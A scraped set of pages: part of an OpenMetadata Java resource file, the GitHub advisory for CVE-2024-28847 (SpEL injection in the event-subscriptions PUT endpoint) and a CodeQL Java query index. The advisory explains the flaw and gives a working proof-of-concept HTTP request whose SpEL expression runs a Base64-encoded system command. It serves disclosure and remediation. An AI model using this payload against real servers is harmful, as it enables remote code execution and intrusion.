 @GET @Path("/{eventSubscriptionId}/status") @Valid @Operation( operationId = "getEventSubscriptionStatusById", summary = "Get Event Subscription status by Id", description = "Get a event Subscription status by given Name", responses = { @ApiResponse( responseCode = "200", description = "Return the current status of the Event Subscription", content = @Content(mediaType = "application/json", schema = @Schema(implementation = SubscriptionStatus.class))), @ApiResponse(responseCode = "404", description = "Entity for instance {id} is not found") }) public SubscriptionStatus getEventSubscriptionStatusById( @Context UriInfo uriInfo, @Context SecurityContext securityContext, @Parameter(description = "Name of the Event Subscription", schema = @Schema(type = "UUID")) @PathParam("eventSubscriptionId") UUID id) { return repository.getStatusForEventSubscription(id); }
 @GET @Path("/functions") @Operation( operationId = "listEventSubscriptionFunctions", summary = "Get list of Event Subscription functions used in filtering EventSubscription", description = "Get list of Event Subscription functions used in filtering conditions in Event Subscriptions") public List<Function> listEventSubscriptionFunctions( @Context UriInfo uriInfo, @Context SecurityContext securityContext) { return new ArrayList<>(AlertUtil.getAlertFilterFunctions().values()); }
 @GET @Path("/resources") @Operation( operationId = "listEventSubscriptionResources", summary = "Get list of Event Subscriptions Resources used in filtering Event Subscription", description = "Get list of EventSubscription functions used in filtering conditions in Event Subscription") public ResultList<SubscriptionResourceDescriptor> listEventSubResources( @Context UriInfo uriInfo, @Context SecurityContext securityContext) { return new ResultList<>(EventsSubscriptionRegistry.listResourceDescriptors()); }
 @GET @Path("/validation/condition/{expression}") @Operation( operationId = "validateCondition", summary = "Validate a given condition", description = "Validate a given condition expression used in filtering rules.", responses = { @ApiResponse(responseCode = "204", description = "No value is returned"), @ApiResponse(responseCode = "400", description = "Invalid expression") }) public void validateCondition( @Context UriInfo uriInfo, @Context SecurityContext securityContext, @Parameter(description = "Expression to validate", schema = @Schema(type = "string")) @PathParam("expression") String expression) { AlertUtil.validateExpression(expression, Boolean.class); }
 public EventSubscription getEventSubscription(CreateEventSubscription create, String user) { return repository .copy(new EventSubscription(), create, user) .withAlertType(create.getAlertType()) .withTrigger(create.getTrigger()) .withEnabled(create.getEnabled()) .withBatchSize(create.getBatchSize()) .withTimeout(create.getTimeout()) .withFilteringRules(create.getFilteringRules()) .withSubscriptionType(create.getSubscriptionType()) .withSubscriptionConfig(create.getSubscriptionConfig()) .withProvider(create.getProvider()); }
 public static List<SubscriptionResourceDescriptor> getDescriptors() throws IOException { List<String> jsonDataFiles = EntityUtil.getJsonDataResources(".\*json/data/EventSubResourceDescriptor.json$"); if (jsonDataFiles.size() != 1) { LOG.warn("Invalid number of jsonDataFiles {}. Only one expected.", jsonDataFiles.size()); return Collections.emptyList(); } String jsonDataFile = jsonDataFiles.get(0); try { String json = CommonUtil.getResourceAsStream(EventSubscriptionResource.class.getClassLoader(), jsonDataFile); return JsonUtils.readObjects(json, SubscriptionResourceDescriptor.class); } catch (Exception e) { LOG.warn("Failed to initialize the events subscription resource descriptors from file {}", jsonDataFile, e); } return Collections.emptyList(); }}

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_0b9112aa_20250111_083601.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopen-metadata%2FOpenMetadata%2Fsecurity%2Fadvisories%2FGHSA-8p5r-6mvv-2435)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopen-metadata%2FOpenMetadata%2Fsecurity%2Fadvisories%2FGHSA-8p5r-6mvv-2435)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=open-metadata%2FOpenMetadata)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[open-metadata](/open-metadata)
/
**[OpenMetadata](/open-metadata/OpenMetadata)**
Public

* [Notifications](/login?return_to=%2Fopen-metadata%2FOpenMetadata) You must be signed in to change notification settings
* [Fork
  1.1k](/login?return_to=%2Fopen-metadata%2FOpenMetadata)
* [Star
   5.9k](/login?return_to=%2Fopen-metadata%2FOpenMetadata)

* [Code](/open-metadata/OpenMetadata)
* [Issues
  395](/open-metadata/OpenMetadata/issues)
* [Pull requests
  92](/open-metadata/OpenMetadata/pulls)
* [Discussions](/open-metadata/OpenMetadata/discussions)
* [Actions](/open-metadata/OpenMetadata/actions)
* [Projects
  0](/open-metadata/OpenMetadata/projects)
* [Wiki](/open-metadata/OpenMetadata/wiki)
* [Security](/open-metadata/OpenMetadata/security)
* [Insights](/open-metadata/OpenMetadata/pulse)

Additional navigation options

* [Code](/open-metadata/OpenMetadata)
* [Issues](/open-metadata/OpenMetadata/issues)
* [Pull requests](/open-metadata/OpenMetadata/pulls)
* [Discussions](/open-metadata/OpenMetadata/discussions)
* [Actions](/open-metadata/OpenMetadata/actions)
* [Projects](/open-metadata/OpenMetadata/projects)
* [Wiki](/open-metadata/OpenMetadata/wiki)
* [Security](/open-metadata/OpenMetadata/security)
* [Insights](/open-metadata/OpenMetadata/pulse)

# SpEL Injection in `PUT /api/v1/events/subscriptions` (`GHSL-2023-251`)

Moderate

[tutte](/tutte)
published
GHSA-8p5r-6mvv-2435
Mar 15, 2024

## Package

No package listed

## Affected versions

< 1.2.4

## Patched versions

1.2.4

## Description

### SpEL Injection in `PUT /api/v1/events/subscriptions` (`GHSL-2023-251`)

***Please note, only authenticated users have access to PUT / POST APIS for /api/v1/policies. Non authenticated users will not be able to access these APIs to exploit the vulnerability. A user must exist in OpenMetadata and have authenticated themselves to exploit this vulnerability.***

Similarly to the GHSL-2023-250 issue, `AlertUtil::validateExpression` is also called from [`EventSubscriptionRepository.prepare()`](https://github.com/open-metadata/OpenMetadata/blob/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java/org/openmetadata/service/jdbi3/EventSubscriptionRepository.java#L69-L83), which can lead to Remote Code Execution.

```
  @Override
  public void prepare(EventSubscription entity, boolean update) {
    validateFilterRules(entity);
  }

  private void validateFilterRules(EventSubscription entity) {
    // Resolve JSON blobs into Rule object and perform schema based validation
    if (entity.getFilteringRules() != null) {
      List<EventFilterRule> rules = entity.getFilteringRules().getRules();
      // Validate all the expressions in the rule
      for (EventFilterRule rule : rules) {
        AlertUtil.validateExpression(rule.getCondition(), Boolean.class);
      }
      rules.sort(Comparator.comparing(EventFilterRule::getName));
    }
  }
```

`prepare()` is called from [`EntityRepository.prepareInternal()`](https://github.com/open-metadata/OpenMetadata/blob/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java/org/openmetadata/service/jdbi3/EntityRepository.java#L693) which, in turn, gets called from the [`EntityResource.createOrUpdate()`](https://github.com/open-metadata/OpenMetadata/blob/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java/org/openmetadata/service/resources/EntityResource.java#L219):

```
public Response createOrUpdate(UriInfo uriInfo, SecurityContext securityContext, T entity) {
  repository.prepareInternal(entity, true);

  // If entity does not exist, this is a create operation, else update operation
  ResourceContext<T> resourceContext = getResourceContextByName(entity.getFullyQualifiedName());
  MetadataOperation operation = createOrUpdateOperation(resourceContext);
  OperationContext operationContext = new OperationContext(entityType, operation);
  if (operation == CREATE) {
    CreateResourceContext<T> createResourceContext = new CreateResourceContext<>(entityType, entity);
    authorizer.authorize(securityContext, operationContext, createResourceContext);
    entity = addHref(uriInfo, repository.create(uriInfo, entity));
    return new PutResponse<>(Response.Status.CREATED, entity, RestUtil.ENTITY_CREATED).toResponse();
  }
  authorizer.authorize(securityContext, operationContext, resourceContext);
  PutResponse<T> response = repository.createOrUpdate(uriInfo, entity);
  addHref(uriInfo, response.getEntity());
  return response.toResponse();
}
```

Note that, even though there is an authorization check (`authorizer.authorize()`), it gets called after `prepareInternal()` gets called and, therefore, after the SpEL expression has been evaluated.

In order to reach this method, an attacker can send a PUT request to `/api/v1/events/subscriptions` which gets handled by [`EventSubscriptionResource.createOrUpdateEventSubscription()`](https://github.com/open-metadata/OpenMetadata/blob/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java/org/openmetadata/service/resources/events/subscription/EventSubscriptionResource.java#L289):

```
@PUT
@Operation(
    operationId = "createOrUpdateEventSubscription",
    summary = "Updated an existing or create a new Event Subscription",
    description = "Updated an existing or create a new Event Subscription",
    responses = {
      @ApiResponse(
          responseCode = "200",
          description = "create Event Subscription",
          content =
              @Content(
                  mediaType = "application/json",
                  schema = @Schema(implementation = CreateEventSubscription.class))),
      @ApiResponse(responseCode = "400", description = "Bad request")
    })
public Response createOrUpdateEventSubscription(
    @Context UriInfo uriInfo, @Context SecurityContext securityContext, @Valid CreateEventSubscription create) {
  // Only one Creation is allowed for Data Insight
  if (create.getAlertType() == CreateEventSubscription.AlertType.DATA_INSIGHT_REPORT) {
    try {
      repository.getByName(null, create.getName(), repository.getFields("id"));
    } catch (EntityNotFoundException ex) {
      if (ReportsHandler.getInstance() != null && ReportsHandler.getInstance().getReportMap().size() > 0) {
        throw new BadRequestException("Data Insight Report Alert already exists.");
      }
    }
  }
  EventSubscription eventSub = getEventSubscription(create, securityContext.getUserPrincipal().getName());
  Response response = createOrUpdate(uriInfo, securityContext, eventSub);
  repository.updateEventSubscription((EventSubscription) response.getEntity());
  return response;
}
```

This vulnerability was discovered with the help of CodeQL's [Expression language injection (Spring)](https://codeql.github.com/codeql-query-help/java/java-spel-expression-injection/) query.

#### Proof of concept

* Prepare the payload
  + Encode the command to be run (eg: `touch /tmp/pwned`) using Base64 (eg: `dG91Y2ggL3RtcC9wd25lZA==`)
  + Create the SpEL expression to run the system command: `T(java.lang.Runtime).getRuntime().exec(new java.lang.String(T(java.util.Base64).getDecoder().decode("dG91Y2ggL3RtcC9wd25lZA==")))`
* Send the payload using a valid JWT token:

```
PUT /api/v1/events/subscriptions HTTP/1.1
Host: localhost:8585
Authorization: Bearer <non-admin JWT>
accept: application/json
Connection: close
Content-Type: application/json
Content-Length: 353

{
"name":"ActivityFeedAlert","displayName":"Activity Feed Alerts","alertType":"ChangeEvent","filteringRules":{"rules":[
{"name":"pwn","effect":"exclude","condition":"T(java.lang.Runtime).getRuntime().exec(new java.lang.String(T(java.util.Base64).getDecoder().decode('dG91Y2ggL3RtcC9wd25lZA==')))"}]},"subscriptionType":"ActivityFeed","enabled":true
}
```

* Verify that a file called `/tmp/pwned` was created in the OpenMetadata server

#### Impact

This issue may lead to Remote Code Execution.

#### Remediation

Use [`SimpleEvaluationContext`](https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/expression/spel/support/SimpleEvaluationContext.html) to exclude *references to Java types, constructors, and bean references*.

### Severity

Moderate

6.8

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Network

Attack complexity
Low

Privileges required
High

User interaction
Required

Scope
Unchanged

Confidentiality
High

Integrity
High

Availability
High

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:U/C:H/I:H/A:H

### CVE ID

CVE-2024-28847

### Weaknesses

No CWEs

### Credits

* [![@pwntester](https://avatars.githubusercontent.com/u/125701?s=40&v=4)](/pwntester)
  [pwntester](/pwntester)
  Finder

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from codeql.github.com_0c051879_20250111_083555.html ===

[CodeQL documentation](https://codeql.github.com/docs)

CodeQL resources

* [CodeQL overview](https://codeql.github.com/docs/codeql-overview)
CodeQL guides
* [Writing CodeQL queries](https://codeql.github.com/docs/writing-codeql-queries)
* [CodeQL language guides](https://codeql.github.com/docs/codeql-language-guides)
  Reference docs
  * [QL language
    reference](https://codeql.github.com/docs/ql-language-reference/)* [CodeQL
      standard-libraries](https://codeql.github.com/codeql-standard-libraries)* [CodeQL
        query help](https://codeql.github.com/codeql-query-help)
        Source files
        * [CodeQL repository](https://github.com/github/codeql)
          Academic
          * [QL publications](https://codeql.github.com/publications)

* [CodeQL query help for C and C++](../../cpp/)
* [CodeQL query help for C#](../../csharp/)
* [CodeQL query help for Go](../../go/)
* [CodeQL query help for Java and Kotlin](../)
  + [Access Java object methods through JavaScript exposure](../java-android-webview-addjavascriptinterface/)
  + [Access to unsupported JDK-internal API](../java-jdk-internal-api-access/)
  + [Android APK installation](../java-android-arbitrary-apk-installation/)
  + [Android Intent redirection](../java-android-intent-redirection/)
  + [Android WebSettings file access](../java-android-websettings-file-access/)
  + [Android WebView JavaScript settings](../java-android-websettings-javascript-enabled/)
  + [Android WebView settings allows access to content links](../java-android-websettings-allow-content-access/)
  + [Android Webview debugging enabled](../java-android-webview-debugging-enabled/)
  + [Android `WebView` that accepts all certificates](../java-improper-webview-certificate-validation/)
  + [Android debuggable attribute enabled](../java-android-debuggable-attribute-enabled/)
  + [Android fragment injection](../java-android-fragment-injection/)
  + [Android fragment injection in PreferenceActivity](../java-android-fragment-injection-preference-activity/)
  + [Android missing certificate pinning](../java-android-missing-certificate-pinning/)
  + [Android sensitive keyboard cache](../java-android-sensitive-keyboard-cache/)
  + [AnnotationPresent check](../java-ineffective-annotation-present-check/)
  + [Application backup allowed](../java-android-backup-enabled/)
  + [Arbitrary file access during archive extraction (”Zip Slip”)](../java-zipslip/)
  + [Array index out of bounds](../java-index-out-of-bounds/)
  + [Bad implementation of an event Adapter](../java-wrong-swing-event-adapter-signature/)
  + [Bad suite method](../java-wrong-junit-suite-signature/)
  + [Boxed variable is never null](../java-non-null-boxed-variable/)
  + [Building a command line with string concatenation](../java-concatenated-command-line/)
  + [Building a command with an injected environment variable](../java-exec-tainted-environment/)
  + [Call to Iterator.remove may fail](../java-iterator-remove-failure/)
  + [Cast from abstract to concrete collection](../java-abstract-to-concrete-cast/)
  + [Chain of ‘instanceof’ tests](../java-chained-type-tests/)
  + [Character passed to StringBuffer or StringBuilder constructor](../java-string-buffer-char-init/)
  + [Class has same name as super class](../java-class-name-matches-super-class/)
  + [Cleartext storage of sensitive information in cookie](../java-cleartext-storage-in-cookie/)
  + [Cleartext storage of sensitive information in the Android filesystem](../java-android-cleartext-storage-filesystem/)
  + [Cleartext storage of sensitive information using ‘Properties’ class](../java-cleartext-storage-in-properties/)
  + [Cleartext storage of sensitive information using `SharedPreferences` on Android](../java-android-cleartext-storage-shared-prefs/)
  + [Cleartext storage of sensitive information using a local database on Android](../java-android-cleartext-storage-database/)
  + [Comparison of identical values](../java-comparison-of-identical-expressions/)
  + [Comparison of narrow type with wide type in loop condition](../java-comparison-with-wider-type/)
  + [Confusing method names because of capitalization](../java-confusing-method-name/)
  + [Confusing non-overriding of package-private method](../java-non-overriding-package-private/)
  + [Confusing overloading of methods](../java-confusing-method-signature/)
  + [Constant interface anti-pattern](../java-constants-only-interface/)
  + [Constant loop condition](../java-constant-loop-condition/)
  + [Container contents are never accessed](../java-unused-container/)
  + [Container contents are never initialized](../java-empty-container/)
  + [Container size compared to zero](../java-test-for-negative-container-size/)
  + [Continue statement that does not continue](../java-continue-in-false-loop/)
  + [Contradictory type checks](../java-contradictory-type-checks/)
  + [Creates empty ZIP file entry](../java-empty-zip-file-entry/)
  + [Cross-site scripting](../java-xss/)
  + [Dangerous non-short-circuit logic](../java-non-short-circuit-evaluation/)
  + [Dangerous runFinalizersOnExit](../java-run-finalizers-on-exit/)
  + [Depending upon JCenter/Bintray as an artifact repository](../java-maven-dependency-upon-bintray/)
  + [Deprecated method or constructor invocation](../java-deprecated-call/)
  + [Dereferenced expression may be null](../java-dereferenced-expr-may-be-null/)
  + [Dereferenced variable is always null](../java-dereferenced-value-is-always-null/)
  + [Dereferenced variable may be null](../java-dereferenced-value-may-be-null/)
  + [Deserialization of user-controlled data](../java-unsafe-deserialization/)
  + [Detect JHipster Generator Vulnerability CVE-2019-16303](../java-jhipster-prng/)
  + [Direct call to a run() method](../java-call-to-thread-run/)
  + [Disabled Netty HTTP header validation](../java-netty-http-request-or-response-splitting/)
  + [Disabled Spring CSRF protection](../java-spring-disabled-csrf-protection/)
  + [Double-checked locking is not thread-safe](../java-unsafe-double-checked-locking/)
  + [Equals method does not inspect argument type](../java-unchecked-cast-in-equals/)
  + [Equals on incomparable types](../java-equals-on-unrelated-types/)
  + [Equals or hashCode on arrays](../java-equals-on-arrays/)
  + [Executing a command with a relative path](../java-relative-path-command/)
  + [Exposing internal representation](../java-internal-representation-exposure/)
  + [Exposure of sensitive information to UI text views](../java-android-sensitive-text/)
  + [Exposure of sensitive information to notifications](../java-android-sensitive-notification/)
  + [Expression always evaluates to the same value](../java-evaluation-to-constant/)
  + [Expression language injection (JEXL)](../java-jexl-expression-injection/)
  + [Expression language injection (MVEL)](../java-mvel-expression-injection/)
  + Expression language injection (Spring)
  + [Externalizable but no public no-argument constructor](../java-missing-no-arg-constructor-on-externalizable/)
  + [Failure to use HTTPS or SFTP URL in Maven artifact upload/download](../java-maven-non-https-url/)
  + [Failure to use secure cookies](../java-insecure-cookie/)
  + [Field masks field in super class](../java-field-masks-super-field/)
  + [Finalizer inconsistency](../java-missing-super-finalize/)
  + [Futile synchronization on field](../java-unsafe-sync-on-field/)
  + [Groovy Language injection](../java-groovy-injection/)
  + [HTTP response splitting](../java-http-response-splitting/)
  + [Hard-coded credential in API call](../java-hardcoded-credential-api-call/)
  + [Hashed value without hashCode definition](../java-hashing-without-hashcode/)
  + [Ignored error status of call](../java-ignored-error-status-of-call/)
  + [Implicit conversion from array to string](../java-print-array/)
  + [Implicit narrowing conversion in compound assignment](../java-implicit-cast-in-compound-assignment/)
  + [Implicitly exported Android component](../java-android-implicitly-exported-component/)
  + [Improper validation of user-provided array index](../java-improper-validation-of-array-index/)
  + [Improper validation of user-provided size used for array construction](../java-improper-validation-of-array-construction/)
  + [Improper verification of intent by broadcast receiver](../java-improper-intent-verification/)
  + [Inconsistent compareTo](../java-inconsistent-compareto-and-equals/)
  + [Inconsistent equals and hashCode](../java-inconsistent-equals-and-hashcode/)
  + [Inconsistent synchronization for writeObject()](../java-inconsistent-sync-writeobject/)
  + [Inconsistent synchronization of getter and setter](../java-unsynchronized-getter/)
  + [Incorrect absolute value of random number](../java-abs-of-random/)
  + [Incorrect serialVersionUID field](../java-incorrect-serial-version-uid/)
  + [Inefficient String constructor](../java-inefficient-string-constructor/)
  + [Inefficient empty string test](../java-inefficient-empty-string-test/)
  + [Inefficient output stream](../java-inefficient-output-stream/)
  + [Inefficient primitive constructor](../java-inefficient-boxed-constructor/)
  + [Inefficient regular expression](../java-redos/)
  + [Inefficient use of key set iterator](../java-inefficient-key-set-iterator/)
  + [Information exposure through a stack trace](../java-stack-trace-exposure/)
  + [Information exposure through an error message](../java-error-message-exposure/)
  + [Inner class could be static](../java-non-static-nested-class/)
  + [Insecure Bean Validation](../java-insecure-bean-validation/)
  + [Insecure JavaMail SSL Configuration](../java-insecure-smtp-ssl/)
  + [Insecure LDAP authentication](../java-insecure-ldap-auth/)
  + [Insecure basic authentication](../java-insecure-basic-auth/)
  + [Insecure local authentication](../java-android-insecure-local-authentication/)
  + [Insecure randomness](../java-insecure-randomness/)
  + [Insecurely generated keys for local authentication](../java-android-insecure-local-key-gen/)
  + [Insertion of sensitive information into log files](../java-sensitive-log/)
  + [Intent URI permission manipulation](../java-android-intent-uri-permission-manipulation/)
  + [Interface cannot be implemented](../java-unimplementable-interface/)
  + [Iterable wrapping an iterator](../java-iterable-wraps-iterator/)
  + [Iterator implementing Iterable](../java-iterator-implements-iterable/)
  + [JNDI lookup with user-controlled name](../java-jndi-injection/)
  + [Javadoc has impossible ‘throws’ tag](../java-inconsistent-javadoc-throws/)
  + [LDAP query built from user-controlled sources](../java-ldap-injection/)
  + [Leaking sensitive information through a ResultReceiver](../java-android-sensitive-result-receiver/)
  + [Leaking sensitive information through an implicit Intent](../java-android-sensitive-communication/)
  + [Left shift by more than the type width](../java-lshift-larger-than-type-width/)
  + [Local information disclosure in a temporary directory](../java-local-temp-file-or-directory-information-disclosure/)
  + [Log Injection](../java-log-injection/)
  + [Loop with unreachable exit condition](../java-unreachable-exit-in-loop/)
  + [Misleading indentation](../java-misleading-indentation/)
  + [Missing JWT signature check](../java-missing-jwt-signature-check/)
  + [Missing Override annotation](../java-missing-override-annotation/)
  + [Missing catch of NumberFormatException](../java-uncaught-number-format-exception/)
  + [Missing enum case in switch](../java-missing-case-in-switch/)
  + [Missing format argument](../java-missing-format-argument/)
  + [Missing read or write permission in a content provider](../java-android-incomplete-provider-permissions/)
  + [Missing space in string literal](../java-missing-space-in-concatenation/)
  + [Missing super clone](../java-missing-call-to-super-clone/)
  + [Multiplication of remainder](../java-multiplication-of-remainder/)
  + [Next in hasNext implementation](../java-iterator-hasnext-calls-next/)
  + [No clone method](../java-missing-clone-method/)
  + [Non-final method invocation in constructor](../java-non-final-call-in-constructor/)
  + [Non-synchronized override of synchronized method](../java-non-sync-override/)
  + [OGNL Expression Language statement with user-controlled input](../java-ognl-injection/)
  + [Overloaded compareTo](../java-wrong-compareto-signature/)
  + [Overloaded equals](../java-wrong-equals-signature/)
  + [Overly permissive regular expression range](../java-overly-large-range/)
  + [Partial path traversal vulnerability](../java-partial-path-traversal/)
  + [Partial path traversal vulnerability from remote](../java-partial-path-traversal-from-remote/)
  + [Polynomial regular expression used on uncontrolled data](../java-polynomial-redos/)
  + [Possible confusion of local and field](../java-local-shadows-field/)
  + [Potential database resource leak](../java-database-resource-leak/)
  + [Potential input resource leak](../java-input-resource-leak/)
  + [Potential output resource leak](../java-output-resource-leak/)
  + [Query built by concatenation with a possibly-untrusted string](../java-concatenated-sql-query/)
  + [Query built from user-controlled sources](../java-sql-injection/)
  + [Race condition in double-checked locking object initialization](../java-unsafe-double-checked-locking-init-order/)
  + [Race condition in socket authentication](../java-socket-auth-race-condition/)
  + [Random used only once](../java-random-used-once/)
  + [ReadResolve must have Object return type, not void](../java-wrong-readresolve-signature/)
  + [Reading from a world writable file](../java-world-writable-file-read/)
  + [Reference equality test of boxed types](../java-reference-equality-of-boxed-types/)
  + [Reference equality test on strings](../java-reference-equality-on-strings/)
  + [Regular expression injection](../java-regex-injection/)
  + [Resolving XML external entity in user-controlled data](../java-xxe/)
  + [Result of multiplication cast to wider type](../java-integer-multiplication-cast-to-long/)
  + [Self assignment](../java-redundant-assignment/)
  + [Serializable but no void constructor](../java-missing-no-arg-constructor-on-serializable/)
  + [Serializable inner class of non-serializable class](../java-non-serializable-inner-class/)
  + [Serialization methods do not match required signature](../java-wrong-object-serialization-signature/)
  + [Server-side request forgery](../java-ssrf/)
  + [Server-side template injection](../java-server-side-template-injection/)
  + [Sleep with lock held](../java-sleep-with-lock-held/)
  + [Spin on field](../java-spin-on-field/)
  + [Spurious Javadoc @param tags](../java-unknown-javadoc-parameter/)
  + [Start of thread in constructor](../java-thread-start-in-constructor/)
  + [Subtle call to inherited method](../java-subtle-inherited-call/)
  + [Suspicious date format](../java-suspicious-date-format/)
  + [Synchronization on boxed types or strings](../java-sync-on-boxed-types/)
  + [Thread-unsafe use of DateFormat](../java-thread-unsafe-dateformat/)
  + [Time-of-check time-of-use race condition](../java-toctou-race-condition/)
  + [Trust boundary violation](../java-trust-boundary-violation/)
  + [Type bound extends a final class](../java-type-bound-extends-final/)
  + [Type mismatch on container access](../java-type-mismatch-access/)
  + [Type mismatch on container modification](../java-type-mismatch-modification/)
  + [Type variable hides another type](../java-type-variable-hides-type/)
  + [Typo in equals](../java-equals-typo/)
  + [Typo in hashCode](../java-hashcode-typo/)
  + [Typo in toString](../java-tostring-typo/)
  + [URL forward from a remote source](../java-unvalidated-url-forward/)
  + [URL redirection from remote source](../java-unvalidated-url-redirection/)
  + [Uncontrolled command line](../java-command-line-injection/)
  + [Uncontrolled data in arithmetic expression](../java-uncontrolled-arithmetic/)
  + [Uncontrolled data used in content resolution](../java-android-unsafe-content-uri-resolution/)
  + [Uncontrolled data used in path expression](../java-path-injection/)
  + [Underscore used as identifier](../java-underscore-identifier/)
  + [Unreachable catch clause](../java-unreachable-catch-clause/)
  + [Unread local variable](../java-local-variable-is-never-read/)
  + [Unreleased lock](../java-unreleased-lock/)
  + [Unsafe certificate trust](../java-unsafe-cert-trust/)
  + [Unsafe hostname verification](../java-unsafe-hostname-verification/)
  + [Unsafe resource fetching in Android WebView](../java-android-unsafe-android-webview-fetch/)
  + [Unsafe use of getResource](../java-unsafe-get-resource/)
  + [Unused classes and interfaces](../java-unused-reference-type/)
  + [Unused format argument](../java-unused-format-argument/)
  + [Unused label](../java-unused-label/)
  + [Use of RSA algorithm without OAEP](../java-rsa-without-oaep/)
  + [Use of a broken or risky cryptographic algorithm](../java-weak-cryptographic-algorithm/)
  + [Use of a cryptographic algorithm with insufficient key size](../java-insufficient-key-size/)
  + [Use of a potentially broken or risky cryptographic algorithm](../java-potentially-weak-cryptographic-algorithm/)
  + [Use of a potentially dangerous function](../java-potentially-dangerous-function/)
  + [Use of a predictable seed in a secure random number generator](../java-predictable-seed/)
  + [Use of default toString()](../java-call-to-object-tostring/)
  + [Use of externally-controlled format string](../java-tainted-format-string/)
  + [Use of implicit PendingIntents](../java-android-implicit-pendingintents/)
  + [Useless comparison test](../java-constant-comparison/)
  + [Useless null check](../java-useless-null-check/)
  + [Useless parameter](../java-unused-parameter/)
  + [Useless toString on String](../java-useless-tostring-call/)
  + [Useless type test](../java-useless-type-test/)
  + [User-controlled bypass of sensitive method](../java-user-controlled-bypass/)
  + [User-controlled data in arithmetic expression](../java-tainted-arithmetic/)
  + [User-controlled data in numeric cast](../java-tainted-numeric-cast/)
  + [User-controlled data used in permissions check](../java-tainted-permissions-check/)
  + [Using a static initialization vector for encryption](../java-static-initialization-vector/)
